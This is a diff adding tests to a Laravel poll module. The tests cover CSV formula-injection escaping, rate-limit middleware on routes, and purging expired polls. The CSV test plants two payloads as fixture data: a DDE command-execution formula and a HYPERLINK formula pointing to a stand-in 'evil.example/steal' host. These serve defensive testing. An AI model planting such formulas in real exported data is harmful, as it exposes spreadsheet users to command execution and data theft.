@@ -13,6 +13,7 @@ declare(strict_types=1);
 
 use App\Models\User;
 use Illuminate\Foundation\Testing\RefreshDatabase;
+use Illuminate\Support\Facades\Route;
 use Illuminate\Support\Str;
 use Modules\Decido\Models\Poll;
 use Modules\Decido\Models\PollOption;
@@ -408,4 +409,50 @@ test('PollExportService::exportIcs lève une exception si le sondage n’est pas
 
     $this->expectException(RuntimeException::class);
     (new PollExportService)->exportIcs($poll);
+});
+
+test('export CSV neutralise l’injection de formule (voter_pseudonym contrôlé par un votant anonyme)', function (): void {
+    // Round 5 adversarial (skill /100) : sans neutralisation, une valeur commençant par =/+/-/@
+    // est interprétée comme une formule active par Excel/Google Sheets à l'ouverture par
+    // l'organisateur (OWASP CSV Injection).
+    $poll = decidoCreatePoll();
+    $option = $poll->options()->create(['label' => '=cmd|"/c calc"!A1', 'sort_order' => 0]);
+    $option->votes()->create([
+        'poll_id' => $poll->id,
+        'voter_token' => Str::uuid()->toString(),
+        'voter_pseudonym' => '=HYPERLINK("http://evil.example/steal","clique ici")',
+        'value' => 'selected',
+    ]);
+
+    $csv = (new PollExportService)->exportCsv($poll->fresh(['options.votes']));
+
+    expect($csv)->toContain("'=HYPERLINK");
+    expect($csv)->toContain("'=cmd|");
+    expect($csv)->not->toContain('"=HYPERLINK');
+});
+
+test('decido.store et decido.vote.store portent un middleware throttle (anti-abus)', function (): void {
+    $storeMiddleware = collect(Route::getRoutes()->getByName('decido.store')->gatherMiddleware());
+    $voteMiddleware = collect(Route::getRoutes()->getByName('decido.vote.store')->gatherMiddleware());
+
+    expect($storeMiddleware->contains(fn ($m) => str_starts_with($m, 'throttle:')))->toBeTrue();
+    expect($voteMiddleware->contains(fn ($m) => str_starts_with($m, 'throttle:')))->toBeTrue();
+});
+
+test('decido:purge-expired supprime les sondages clôturés expirés et épargne les autres', function (): void {
+    $expired = decidoCreatePoll(['status' => 'closed']);
+    $expired->expires_at = now()->subDay();
+    $expired->save();
+
+    $notYetExpired = decidoCreatePoll(['status' => 'closed']);
+    $notYetExpired->expires_at = now()->addMonths(3);
+    $notYetExpired->save();
+
+    $stillOpen = decidoCreatePoll(['status' => 'open']);
+
+    $this->artisan('decido:purge-expired')->assertExitCode(0);
+
+    expect(Poll::find($expired->id))->toBeNull();
+    expect(Poll::find($notYetExpired->id))->not->toBeNull();
+    expect(Poll::find($stillOpen->id))->not->toBeNull();
 });
